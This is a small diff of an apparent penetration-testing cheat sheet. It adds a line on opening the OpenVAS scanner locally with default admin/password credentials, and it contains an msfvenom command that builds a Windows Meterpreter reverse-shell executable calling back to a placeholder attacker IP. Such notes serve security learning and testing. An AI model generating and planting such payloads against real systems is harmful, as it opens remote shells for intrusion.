@@ -308,6 +308,7 @@ https://nvd.nist.gov/vuln/search
 
 **OpenVAS**<br>
 Vulnerability scanner
+start from Applications -> open browser -> 127.0.0.1:9392 -> admin/password
 
 **To create a Payload**<br>
 msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=attacker_IP LPORT=attacker_Port -o filename.exe 
